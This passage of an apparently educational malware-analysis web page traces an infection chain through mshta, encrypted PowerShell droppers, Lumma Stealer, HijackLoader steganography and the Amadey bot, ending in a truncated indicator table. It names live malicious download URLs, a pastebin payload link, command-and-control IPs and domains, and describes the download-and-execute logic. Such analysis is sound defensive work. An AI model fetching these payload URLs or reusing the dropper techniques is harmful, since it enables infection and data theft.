              <div class="mt-2">Figure 11 : Embedded JavaScript</div>
            </div>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-13.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 12 : More Embedded JavaScript</div>
            </div>
            <br /><br />
            mshta.exe is a legitimate Windows utility that runs HTML Application
            (HTA) files. <br /><br />HTA files can contain VBScript, JScript, or
            other executable content. <br /><br />
            It is often abused by attackers because:
            <ul>
              <li class="mt-3">
                <b>It bypasses certain security restrictions (e.g., UAC).</b>
              </li>
              <li class="mt-3">
                <b
                  >It can execute scripts embedded in seemingly harmless
                  files.</b
                >
              </li>
            </ul>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-14.png"
                class="chapter-img"
              />
              <div class="mt-2">
                Figure 13 : Strings extracted from the .mp4 file
              </div>
            </div>
            <br /><br />
            The script was extracted to analyze its behavior. Dynamic analysis
            confirmed that it attempts to execute JavaScript, which then
            launches PowerShell. <br /><br />
            Using the strings utility, the JavaScript code was isolated,
            revealing the following:
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-15.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 14 : Complete JavaScript Code</div>
            </div>
            <br /><br />
            <div class="subheading-02">
              <b>JavaScript breakdown </b>
            </div>
            <br />window.moveTo(9999,0) moves the browser window off-screen to
            hide activity. <br /><br />
            window.onerror = function(){return true} suppresses JavaScript error
            messages. This avoids detection by debugging tools.
            <br /><br />
            <ul>
              <li class="mt-4">
                <b>Obfuscated JavaScript:</b><br /><br />Code is intentionally
                broken and scattered across &lt;script&gt; tags. <br /><br />
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-16.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 15 : Dynamic code injection function
                  </div>
                </div>
                <br /><br />The variable RwLbDN contains a hexadecimal-encoded
                payload. <br /><br />
                The replace function decodes the payload into readable
                JavaScript using String.fromCharCode.
                <ul>
                  <li class="mt-3">
                    HTML DOM Interaction: document.documentElement.outerHTML
                    extracts the full content of the page into Lwozq.
                  </li>
                </ul>
                This can be used for:
                <ul>
                  <li class="mt-3">
                    Exfiltration: Sending the DOM content to a server.
                  </li>
                  <li class="mt-3">
                    Dynamic Code Injection: Decoding and executing content from
                    the page itself.
                  </li>
                </ul>
              </li>
              <li class="mt-4">
                <b>ISO Media File Fragments:</b><br /><br />The script contains
                references to an ISO Media file format: <br /><br />
                <code>ftypisom, moov, trak, stsd, avc1, etc.</code>
                <br /><br />These headers suggest embedded media, or a fake
                media file designed to bypass detection. <br /><br />
                It is possible that the media structure is being used as a
                disguise for malicious content (e.g., steganography).
              </li>
              <li class="mt-4">
                <b>Malicious Execution:</b><br /><br />Decoding the payload with
                eval () executes dynamic JavaScript. <br /><br />
                window.close() may close the window once execution is complete,
                covering tracks. <br /><br />
                The critical line responsible for the Emmenthal Loader payload
                decoding and execution is :
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-17.png"
                    class="chapter-img"
                  />
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-18.png"
                    class="chapter-img"
                  />
                </div>
                <br />This extracted part of the page’s HTML
                (document.documentElement.outerHTML) from index 27 to 109350.
              </li>
            </ul>
            <div class="subheading-02 mt-5">
              <b>AES Encrypted Fileless injection of the Loader </b>
            </div>
            <br /><br />Next , a PowerShell dropper is employed that hides its
            true intent by encrypting the payload. Once run, it decrypts an
            embedded AESencrypted blob, uses dynamic execution to run the
            decrypted code, and then launches a new hidden PowerShell process to
            run an encoded command.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-19.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 16 : Powershell.exe encoded command</div>
            </div>
            <ul>
              <li class="mt-3">
                <b>Powershell Script Traces</b><br /><br />In this case the
                attacker used two layers:
                <ol>
                  <li class="mt-3">
                    An initial dropper that holds a long AESencrypted blob.
                  </li>
                  <li class="mt-3">
                    A decrypted payload that itself launches a hidden PowerShell
                    process (via an encoded command) and then downloads a file
                    (an “index.js”) into the user’s AppData folder and executes
                    it.
                  </li>
                </ol>
                <br /><br />Figure 17 , 18 19 represent the exact order in which
                the scripts have been executed
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-20.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 17 : Encrypted PowerShell</div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-21.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 18 : Encrypted PowerShell</div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-22.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 19 : Encrypted PowerShell</div>
                </div>
              </li>
              <li class="mt-3">
                <b>Deobfuscated PS Code Analysis </b>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-23.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 20 : Encrypted dropper</div>
                </div>
                <br /><br />
                Once decrypted, the payload expands into a multi‐stage dropper.
                Its logic is roughly as follows:
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-24.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 21 : Multistage dropper</div>
                </div>
                <br />
                What This Does:
                <ul style="list-style-type: square">
                  <li class="mt-3">
                    Hidden Execution: <br /><br />The decrypted code immediately
                    launches a hidden PowerShell process using an encoded
                    command. That command (not shown in cleartext) is yet
                    another layer used to further obfuscate execution.
                  </li>
                  <li class="mt-3">
                    <b>File Dropper:</b><br /><br />It sets the AppData folder
                    as the staging area and defines functions to: <br /><br />
                    • Transform Strings into URLs: The function PqEE
                    reconstructs a URL from a portion of the decrypted data.
                    <br /><br />
                    • Download a Secondary Payload: Function EFYb downloads data
                    from that URL and writes it to a file named index.js in
                    AppData. <br /><br />
                    • Execute the Downloaded File: Finally, the CAqhB function
                    calls Start on the dropped index.js file.
                  </li>
                  <li class="mt-3">
                    <b>Chained Infection:</b><br /><br />
                    This two-stage process is designed to evade detection:The
                    first stage (this dropper) is heavily obfuscated. The second
                    stage (the downloaded “index.js”) is likely to be another
                    malicious payload written in JavaScript (or executed via
                    Node), which may perform further actions such as
                    persistence, lateral movement, or data exfiltration.
                  </li>
                  <li class="mt-3">
                    <b>Decryption </b><br /><br />To decrypt the obfuscated
                    PowerShell script, a PowerShell patching method was used to
                    capture and analyse the incremental output at each execution
                    stage. This allowed us to observe what was being printed to
                    the console throughout the decryption process.
                    <div class="mt-4 text-center">
                      <img
                        src="/assets/images/multistage-malware-25.png"
                        class="chapter-img"
                      />
                      <div class="mt-2">
                        Figure 22 : Index JS mention and payload
                      </div>
                      <div class="mt-2">
                        An AES decryption script was used to decrypt the
                        payload.
                      </div>
                    </div>
                    <div class="mt-4 text-center">
                      <img
                        src="/assets/images/multistage-malware-26.png"
                        class="chapter-img"
                      />
                      <div class="mt-2">Figure 23 : Decryption script</div>
                    </div>
                    <div class="mt-4 text-center">
                      <img
                        src="/assets/images/multistage-malware-27.png"
                        class="chapter-img"
                      />
                      <div class="mt-2">Figure 24 : IEX instruction</div>
                      <div class="mt-2">
                        iex instruction is present therefore another custom
                        script was employed to further step through the
                        decryption routine.
                      </div>
                    </div>
                    <div class="mt-4 text-center">
                      <img
                        src="/assets/images/multistage-malware-28.png"
                        class="chapter-img"
                      />
                      <div class="mt-2">Figure 25 : Payload de-obfuscation</div>
                    </div>
                    <br />
                    <div class="mb-2 text-center subheading-02">
                      <b>Result</b>
                    </div>
                    <div class="mt-4 text-center">
                      <img
                        src="/assets/images/multistage-malware-29.png"
                        class="chapter-img"
                      />
                      <div class="mt-2">Figure 26 : UTF Encoded payload</div>
                    </div>
                    <br /><br />
                    The decoded Base64 payload appears to contain PowerShell
                    commands encoded in wide-character (UTF-16) format, as
                    indicated by the alternating null bytes. This suggests that
                    the script is further obfuscated and may be interacting with
                    .NET components, such as the NET.securityProtocolType
                    setting.
                    <div class="mt-4 text-center">
                      <img
                        src="/assets/images/multistage-malware-30.png"
                        class="chapter-img"
                      />
                      <div class="mt-2">Figure 27 : Decoded payload</div>
                    </div>
                    <br /><br />The UTF-16-decoded payload contains PowerShell
                    code involving security settings, a WebClient for
                    downloading a remote script, and execution of that script.
                    <br /><br />
                    <div class="mb-2">
                      <b>What It Does</b><br /><br />
                      • Ensures that Net.WebClient can use TLS, TLS1.1, TLS1.2,
                      and SSL3. <br /><br />
                      • Downloads Additional Script:<br /><br />
                      • Fetches code from https://pastebin.com/raw/fB3K0N1c (the
                      exact URL in your screenshots).<br /><br />
                      • Obfuscated Method Call (“Merge”):<br /><br />
                      • The snippet (New-Object Net.WebClient).("Mer"+"GE")(...)
                      is not a standard .NET method. Attackers often rename or
                      reflectively load methods to hinder detection. This line
                      presumably manipulates the downloaded string ($f1) in some
                      way (e.g., further decryption or string substitution)
                      before storing it in a variable named myU.<br /><br />
                    </div>
                    <br /><br />
                    <b>Execution:</b><br /><br />
                    The final line takes whatever text is in $nU, wraps it as a
                    script block, and executes it via Invoke-Command. That means
                    the ultimate malicious logic is in the code from Pastebin,
                    after being “merged.”
                  </li>
                </ul>
              </li>
            </ul>
            <div class="subheading-02 mt-5">
              <b>Pastebin payload </b>
            </div>
            <br />
            On Pastebin there is a custom RC4 encrypted PowerShell script .
            Possibly the remaining components that tells the loader to fetch and
            drop additional malware.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-31.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 28 : RC4 Encrypted Payloads</div>
            </div>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-32.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 29 : 2nd RC4 payload</div>
            </div>
            <br />The two code snippets appear to be PowerShell scripts with
            obfuscated content, likely intended for malicious purposes. Below is
            a high-level breakdown of their differences:
            <ul>
              <li class="mt-3">
                <b> Obfuscation Techniques</b>
                <ul>
                  <li class="mt-3">
                    First Script: <br /><br />- Uses Base64-encoded data and
                    replaces newlines and commas to form a continuous encoded
                    string. <br /><br />
                    - Implements custom encryption and decryption mechanisms
                    using functions like BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,
                    IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, and
                    QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ. <br /><br />- Operates
                    on byte arrays with XOR and modular arithmetic for
                    decryption.
                  </li>
                  <li class="mt-4">
                    Second Script: <br /><br />
                    - Encodes payloads in a more fragmented and extensive
                    Base64-like format (though it seems heavily obfuscated with
                    potentially invalid data). <br /><br />
                    - Includes long sequences of what appear to be encoded
                    instructions or payloads but in a more scattered and
                    fragmented fashion.
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                Structure
                <ul>
                  <li class="mt-3">
                    First script: <br /><br />
                    - Modularized into clear functions for specific tasks, such
                    as encryption, decryption, and byte manipulation.
                    <br /><br />- Directly decodes the obfuscated content into a
                    command or payload (Invoke-Expression $CCCCCCCCCCCCCCC) for
                    execution.
                  </li>
                  <li class="mt-4">
                    Second Script: <br /><br />- Appears to have a bulk data
                    blob interspersed with delimiters or encoded blocks,
                    possibly to evade detection or analysis. <br /><br />- Does
                    not have clear modularized functions like the first script;
                    it focuses more on embedding large amounts of obfuscated
                    content. <br /><br />
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                Execution Style
                <ul>
                  <li class="mt-3">
                    First script: <br /><br />
                    - Sequential de-obfuscation and execution:
                    <br /><br />1. Decodes Base64 data. <br /><br />
                    2. Applies custom encryption routines. <br /><br />
                    3. Executes the final payload.
                  </li>
                  <li class="mt-4">
                    Second Script: <br /><br />- Its payload or execution flow
                    isn't immediately clear from the provided excerpt due to the
                    heavy obfuscation and lack of discernible processing steps.
                  </li>
                </ul>
              </li>
              <br /><br />
              The Powershell payload with a custom decryption script.
              <div class="mt-4 text-center">
                <img
                  src="/assets/images/multistage-malware-33.png"
                  class="chapter-img"
                />
                <div class="mt-2">Figure 30 : RC4 Decryption script</div>
              </div>
              <div class="mt-4 text-center">
                <img
                  src="/assets/images/multistage-malware-34.png"
                  class="chapter-img"
                />
                <div class="mt-2">Figure 31 : Decoded script</div>
              </div>
              <br />
              This PowerShell script appears to implement a sophisticated
              mechanism for downloading, extracting, and potentially executing
              yet another malicious payload.
              <div class="mt-4 text-center">
                <img
                  src="/assets/images/multistage-malware-35.png"
                  class="chapter-img"
                />
              </div>
              <div class="mt-4 text-center">
                <img
                  src="/assets/images/multistage-malware-36.png"
                  class="chapter-img"
                />
                <div class="mt-2">Figure 32 : Decrypted script</div>
              </div>
              <br />
              This script is a yet another multi stage dropper designed to
              download, extract, and execute additional payloads.
              <br /><br />
              The script first verifies the system’s internet connectivity by
              sending HTTP requests to two distinct domains: 360.net and
              baidu.com. These requests ensure the system is online before
              proceeding with further actions.
              <div class="mt-4 text-center">
                <img
                  src="/assets/images/multistage-malware-37.png"
                  class="chapter-img"
                />
                <div class="mt-2">
                  Figure 33 : Contacted IP’s and connection checks
                </div>
              </div>
              <li class="mt-3">
                Technical Explanation of the script:
                <ul>
                  <li class="mt-4">
                    Initial Delay and Beaconing: <br /><br />
                    - The script starts by sleeping for 3 seconds.
                    <br /><br />
                    - It then makes HTTP GET requests to two Microsoft URLs:
                    <br /><br />
                    <ol>
                      <li class="mt-3">
                        One to download a JSON configuration (wdgts_conf.json)
                        from windows.msn.com.
                      </li>
                      <li class="mt-3">
                        Another to download a JavaScript file
                        (SSR-extension.8ee31b8bbd921f89bd88.js) from
                        ntp.msn.com. These requests might be used to mimic
                        legitimate traffic or to “warm up” network connections.
                      </li>
                    </ol>
                  </li>
                  <li class="mt-5">
                    Downloading the Malicious Archive: <br /><br />
                    - It sets a URL variable pointing to
                    "https://klipmybekoe.shop/naailq1.cpl". Despite the .cpl
                    extension (typically a Control Panel file), in this context
                    it is used to host a ZIP archive. <br /><br />
                    - A new WebClient object is created, and the script
                    downloads data from that URL.
                    <br /><br />
                  </li>
                  <li class="mt-5">
                    Storing the Downloaded Data: <br /><br />
                    - The downloaded data is written to a MemoryStream.
                    <br /><br />
                    - A new, unique folder is created in the LOCALAPPDATA
                    directory by combining it with a newly generated GUID.
                    <br /><br />
                    - The downloaded data is also written as a ZIP file (saved
                    in the TEMP folder with a name based on the GUID).
                  </li>
                  <li class="mt-5">
                    Extracting the Archive: <br /><br />
                    - Using the Shell.Application COM object, the script opens
                    the ZIP file as if it were a folder. <br /><br />
                    - It extracts the contents of the ZIP archive into the newly
                    created folder in LOCALAPPDATA.
                  </li>
                  <div class="mt-4 text-center">
                    <img
                      src="/assets/images/multistage-malware-38.png"
                      class="chapter-img"
                    />
                  </div>
                  <div class="mt-4 text-center">
                    <img
                      src="/assets/images/multistage-malware-39.png"
                      class="chapter-img"
                    />
                    <div class="mt-2">
                      Figure 34 : Downloaded zip file and contents from the
                      Pastebin payload
                    </div>
                  </div>
                  <li class="mt-5">
                    Executing Extracted Payloads:<br /><br />
                    - The script searches the extracted folder (recursively) for
                    any executable files (*.exe).<br /><br />
                    - For each executable found, it runs the file using
                    Start-Process (without opening a new window) and waits for
                    each process to complete.
                  </li>
                </ul>
                <br /><br />
                <b>In summary:</b><br /><br />
                This deobfuscated script acts as a dropper that downloads an
                archive from a remote server, extracts its contents, and
                executes any executables found within. These additional
                executables are likely to be further components of the malware.
              </li>
            </ul>
            <br />
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-7" ref="course-chapter-7">
      <div class="heading-02 text-white fw-s">{{ chapters[7].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[7].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            The CPL file is initially downloaded and stored as a ZIP archive
            within the Temp directory. This ZIP file is then transferred to a
            newly created folder inside the LocalAppData directory. The folder's
            name is dynamically generated using a GUID (Globally Unique
            Identifier).
            <br /><br />
            The image below displays the contents of the downloaded ZIP archive.
            It also contains encrypted files, which will be decrypted and
            executed in the later stages of the infection process.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-40.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 35 : ZIP files</div>
            </div>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-42.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 36 : Lumma Attack Chain</div>
            </div>
            <ul>
              <li class="mt-5">
                <b>Injection into legitimate binary :</b>
                <br /><br />
                The next step in the infection chain involves injection into
                mDNSResponder.exe and more.com. Additionally, the presence of
                the DNSResponder binary inside the retrieved ZIP files is
                observed. <br /><br />
                The mDNSResponder.exe is a legitimate application but it’s used
                to perform DLL sideloading by loading the malicious dll’s upon
                execution .
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-43.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 37 : Legitimate app for injection
                  </div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-44.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 38 : Malicious dll’s</div>
                </div>
                <br />
                The DLL’s then reads a series of encrypted files from the same
                directory , decrypts its contents and reveal common malware
                strings.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-45.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 39 : Encrypted files with lumma stealer config
                  </div>
                </div>
                <br />
                The malicious code in “more.com” is responsible for deploying
                the final payload by injecting it into a newly created process,
                “msiexec.exe.” The injected payload is Lumma Stealer – which is
                capable of stealing sensitive information from the victim’s
                machine.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-46.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 40 : Process Injection</div>
                </div>
              </li>
              <li class="mt-5">
                <b>MSIEXEC.exe -> Powerhsell</b><br /><br />
                The msiexec.exe leverages yet another PowerShell encoded payload
                injection technique <br /><br />
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-47.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 41 : Lumma abusing msiexec</div>
                </div>
                <br /><br />This powershell payload is encoded at first with
                UTF-16LE . Once decoded partially we are prompted with some
                characters like 恤, 怈, 考, etc. that have Unicode code points
                which don’t map to normal ASCII. They might have been produced
                by: <br /><br />
                - A custom routine that transforms each ASCII byte into higher
                Unicode characters, <b>or</b> <br /><br />
                - A double-encoded process where the script text was interpreted
                in the wrong code page, creating strange symbols. <br /><br />
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-48.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 42 : Stepping through the encrypted payload
                  </div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-49.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 43 : Partially decrypted payload
                  </div>
                </div>
                <br /><br />
                Given the errors about “missing the terminator” and the presence
                of random Unicode characters, it’s highly likely that the script
                expects the analysts to do the final string fixes in memory at
                runtime. Hence, seeing partial or broken syntax when trying to
                run it directly.
                <br /><br />
                <b>Script Analysis:</b> <br /><br />
                The obfuscated PowerShell script employs Unicode substitution
                (e.g., 恤 → S, 恑 → y) and control character insertion (e.g., →
                hex 0x14) to disguise key components like the URL
                http://60.14.0.0/netsetup.exe (hidden as 60net), while redundant
                variables (e.g., $Lf恤Lf恤...) and split strings (e.g., Sys +
                tem.Net.WebClient) evade static analysis. The script dynamically
                constructs and executes a downloader using .NET classes
                (System.Net.WebClient.DownloadFile) to fetch a payload into
                %LOCALAPPDATA% and runs it via Start-Process, leveraging
                PowerShell’s flexibility to bypass basic detection mechanisms.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-50.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 43 : Decrypted payload</div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-51.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 44 : Malicious IP – China</div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-52.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 45 : Execution flow of Lumma Stealer / Hijack Loader
                    and Amadey Bot
                  </div>
                </div>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-8" ref="course-chapter-8">
      <div class="heading-02 text-white fw-s">{{ chapters[8].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[8].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            The IDAT loader attack (HIJACK LOADER) leveraged steganography as an
            evasion technique. While steganographic methods, often referred to
            as "Stego" techniques, are widely recognized, their role in
            bypassing security defenses is crucial to understanding how to
            counter such threats effectively. <br /><br />
            Steganography conceals malicious code or files within media content,
            such as images or videos, by embedding the payload in pixel data,
            making detection challenging. <br /><br />
            For instance, in an image with a 24-bit pixel depth (which supports
            16.7 million colors), hidden code can be placed in the least
            significant bits (LSB) of each pixel without noticeably altering the
            image’s appearance. <br /><br />
            Although media files can be scanned, signature-based detection may
            fail to recognize hidden threats due to obfuscation. This enables a
            malware loader to drop the infected media, extract the concealed
            payload, and execute it in memory. In this case, while the image
            exhibited visible distortions, the obfuscation was still effective
            in evading security mechanisms. <br /><br />
            MSIEXEC.exe also spawns another process and drops a binary under the
            path . C:\Users\admin\AppData\Local\Temp\7Q0KYZB9F24T9K51YQ.exe .
            This file also appears to be known by security vendors .
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-53.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 46 : Misexec file modifications</div>
            </div>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-54.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 47 : 7Q0KYZB.. .exe</div>
            </div>
            Once this executable is executed it writes two files to the disk.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-55.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 48 : Dropped files</div>
            </div>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-56.png"
                class="chapter-img"
              />
              <div class="mt-2">
                Figure 49 : C:\Users\admin\AppData\Local\Temp\3513aec4 ( image
                file )
              </div>
            </div>
            <br />
            This file is not a PNG , but a dropper type of file with the IDAT
            parameters present . HijackLoader’s delivery method involves the use
            of a PNG image, which is decrypted and parsed to load the next stage
            of the attack.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-57.png"
                class="chapter-img"
              />
              <div class="mt-2">
                Figure 50 : Evasion technique of IDAT Loader
              </div>
            </div>
            <br />
            IDAT refers to the "image data" chunk within a Portable Network
            Graphics (PNG) image file format. True to its name, the loader
            locates and extracts the Amadey Bot code, which is smuggled onto the
            victim machine within the IDAT block of an embedded steganographic
            .PNG image. <br /><br />
            The user is not intended to see the PNG image. The image used in
            this specific attack was visually distorted. The initial download
            was an executable named 7Q0KYZB9F24T9K51YQ.exe, delivered as part of
            the multi-stage attack flow. Once again shellcode is injected into
            more.com <br /><br />
            The first stage is responsible for retrieving or loading the second
            stage, which contains a module table along with the primary
            instrumentation shellcode. This second stage facilitates shellcode
            injection into either a legitimate DLL or a newly created process.
            Once injected, the main instrumentation shellcode proceeds to
            decrypt and execute the final payload, dynamically adjusting its
            injection method or execution flow based on the file type and
            configuration settings. <br /><br />
            Notably, in this instance, the IDAT modules were directly embedded
            within the primary executable, which was retrieved from
            172[.]67[.]143[.]25 . A very detailed code analysis of Hijack Loader
            can be found at
            <a
              target="_blank"
              href="https://www.zscaler.com/blogs/security-research/technical-analysis-hijackloader"
              >https://www.zscaler.com/blogs/security-research/technical-analysis-hijackloader</a
            >.
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-9" ref="course-chapter-9">
      <div class="heading-02 text-white fw-s">{{ chapters[9].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[9].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            The threat actor behind this campaign also installs the Amadey bot
            in the %temp% directory, using the same method of injecting code
            into "more.com." This injected code subsequently implants the final
            Amadey bot payload into "explorer.exe." <br /><br />
            Once, when Amadey initiates its execution, the malware duplicates
            itself into a TEMP folder (sometimes naming itself bguuwe.exe ,
            different in our analysis instance ).
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-58.png"
                class="chapter-img"
              />
              <div class="mt-2">Image 51 : Amadey Bot self-duplication</div>
            </div>
            <br />
            To ensure persistence, the malware creates a Task Scheduler entry
            called "NodeJS Web Framework" that is set to execute a copy of the
            Amadey bot located in the %Appdata% directory.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-59.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 52 : Scheduled task for persistence</div>
            </div>
            <br />
            Subsequently, Amadey sets up C2 communication and transmits a system
            profile to the adversary’s server. While active, Amadey takes
            screenshots at regular intervals and stores them in the TEMP
            directory, ready to be transmitted to the C2 server with subsequent
            POST requests. Amadey has a very specific structure of POST
            requests, that can be used to identify it with a high degree of
            probability:
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-60.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 53 : C2 comms to Cloudflare IP</div>
            </div>
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-61.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 54 : Amadey PHP Post requets.</div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-10" ref="course-chapter-10">
      <div class="heading-02 text-white fw-s">{{ chapters[10].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[10].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            <table class="table table-striped">
              <thead>
                <tr>
                  <th><b>Malware</b></th>
                  <th><b>Malware</b></th>
                  <th><b>Malware</b></th>
                  <th><b>Malware </b></th>
                  <th><b>Malware</b></th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>Payload installation</td>
                  <td>text</td>
                  <td>https://klipmybekoe.shop/DUV.mp4</td>
                  <td>Link for Emmenthal Loader Payload</td>
                  <td></td>
                </tr>
                <tr>
                  <td>Artifacts dropped</td>
                  <td>sha256</td>
                  <td>
                    a4ea90119fd9dca70be5998762795cb3acb4d1db2178a649ffe8f20433e1dbf0
                  </td>
                  <td>
                    Instruction_695-18121-002_Rev.PDF.lnk Dropped by WebDAV
                    abuse
                  </td>
                  <td></td>
                </tr>
                <tr>
                  <td>Artifacts dropped</td>
                  <td>sha256</td>
                  <td>
                    176befaf8f23d86e75269f789c95cb11da24e631d093c428d43b0358c9c6ae20c891c
                  </td>
                  <td>DUV.mp4 - Emmenthal V2</td>
                  <td>Emmenthal</td>
                </tr>
                <tr>
                  <td>Payload installation</td>
                  <td>text</td>
                  <td>https://pastebin.com/raw/fB3K0N1c</td>
                  <td>Payload retrieval from pastebin</td>
                  <td>Emmenthal</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>url</td>
                  <td>https://klipmybekoe.shop/naailq1.cpl</td>
                  <td>Control Panel File</td>
                  <td></td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>ip-dst</td>
                  <td>172.67.219.117</td>
                  <td>Lumma C2</td>
                  <td>Lumma Stealer</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>ip-dst</td>
                  <td>172.67.143.25</td>
                  <td>Lumma C2</td>
                  <td>Lumma Stealer</td>
                </tr>
                <tr>
                  <td>Artifacts dropped</td>
                  <td>sha256</td>
                  <td>
                    980993860c7c570b1643b76768bffa01934cee6394a4135ae3ce2c5697f28d6b
                  </td>
                  <td>7Q0KYZB9F24T9K51YQ.exe - Hijack Loader</td>
                  <td>HijackLoader</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>ip-dst</td>
                  <td>172.67.219.117</td>
                  <td>Lumma C2</td>
                  <td>Lumma Stealer</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>ip-src</td>
                  <td>172.67.143.25</td>
                  <td>Lumma C2</td>
                  <td>Lumma Stealer</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>ip-dst</td>
                  <td>172.67.135.93</td>
                  <td>Amadey Bot C2</td>
                  <td>Amadey</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>url</td>
                  <td>http://connect.resourcecloud.shop/pLQvfD4d5/index.php</td>
                  <td>POST REQUEST to C2</td>
                  <td>Amadey</td>
                </tr>
                <tr>
                  <td>Network activity</td>
                  <td>domain</td>
                  <td>klipdajemua0.shop</td>
                  <td>C2</td>
                  <td>Amadey</td>
                </tr>
                <tr>
                  <td>Artifacts dropped</td>
                  <td>sha256</td>
                  <td>
                    9b398917c796083a6005ab3f9d78243dbc0fad12be1e196be2b01041d4c951a7
                  </td>
                  <td>IMApp.exe</td>
                  <td>HijackLoader</td>
                </tr>
                <tr>
                  <td>Artifacts dropped</td>
                  <td>sha256</td>
                  <td>
